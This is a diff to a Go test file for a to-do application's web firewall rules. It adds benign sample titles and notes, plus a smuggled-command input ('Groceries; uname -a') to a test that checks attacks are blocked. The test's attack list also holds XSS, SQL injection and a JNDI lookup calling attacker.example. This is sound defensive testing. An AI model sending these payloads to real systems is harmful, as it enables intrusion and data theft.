@@ -64,11 +64,13 @@ var tdZones = []string{"UTC", "Europe/Berlin", "Asia/Kolkata", "Pacific/Auckland
 var tdTitles = []string{"Eat potato’s", "Call the plumber about the sink", "Renew passport — before May!", "Buy 2×4s & wood screws",
 	"Read “The Lantern Keeper”", "Plan Sam's 40th (surprise!)", "Café run: oat milk, beans", "Garden & yard", "Work — Q4",
 	"Who's bringing what?", "Sleep by 11", "Top 3 this week", "Watch the tide tables", "Kill the weeds (again)", "Echo Lake trip, day 2",
-	"Pay rent / utilities", "50% off — ends Friday", "Ask: \"can we move it?\"", "Mi lista de la compra", "Büro aufräumen", "週末の買い物"}
+	"Pay rent / utilities", "50% off — ends Friday", "Ask: \"can we move it?\"", "Mi lista de la compra", "Büro aufräumen", "週末の買い物",
+	"Set a time to find my keys", "Watch the retrieval logs", "Watch this, then nice work"}
 
 // tdProse is what goes in notes, comments and the journal: Markdown with
 // lists, links, emphasis and code, and plain sentences.
 var tdProse = []string{
+	"- \"Are you still watching\" prompt\n- \"Watch together\" feature\n- Metadata retrieval for music (lyrics too) and films",
 	"It went swell",
 	"I want to eat extra potato’s",
 	"- [ ] milk\n- [x] eggs\n- [ ] bread (the seeded one)\n\nSee [the list](https://example.com/lists/groceries) for the rest.",
@@ -690,7 +692,8 @@ type tdAttack struct {
 // too, in an argument the client fills with ids, dates, zones, a repeat
 // rule, a push address or a passkey's answer, in a password sent where no
 // password goes, and in the session cookie. Text, which the set reads as
-// paranoia 1 does, keeps what CRS alone refuses there.
+// paranoia 1 does, keeps what CRS alone refuses there but a command run
+// under another, which plain sentences spell.
 func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 	t.Parallel()
 	g := td{vw{rand.New(rand.NewPCG(7, 22))}}
@@ -720,6 +723,7 @@ func TestTheTendrilsSetKeepsTheAttacks(t *testing.T) {
 		{1, g.mcp(true, "initialize", map[string]any{"protocolVersion": "2025-06-18", "clientInfo": map[string]any{"name": "<img src=x onerror=alert(1)>"}})},
 		{1, g.mcp(false, "notifications/cancelled", map[string]any{"requestId": 3, "reason": "${jndi:ldap://attacker.example/a}"})},
 		{1, tdBody("POST", api+"/ai/capture/jabber", map[string]any{"text": "Groceries, then <script>alert(1)</script>", "space_ids": []string{space}})},
+		{1, tdBody("POST", api+"/ai/capture/jabber", map[string]any{"text": "Groceries; uname -a", "space_ids": []string{space}})},
 		{1, tdBody("POST", api+"/ai/capture/break-down", map[string]any{"task_id": task, "hint": "1' OR '1'='1' --"})},
 		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "label": "<img src=x onerror=alert(1)>"})},
 		{1, tdBody("POST", api+"/admin/ai/providers", map[string]any{"kind": "openai", "extra": map[string]any{"stop": "x' UNION SELECT password FROM users--"}})},
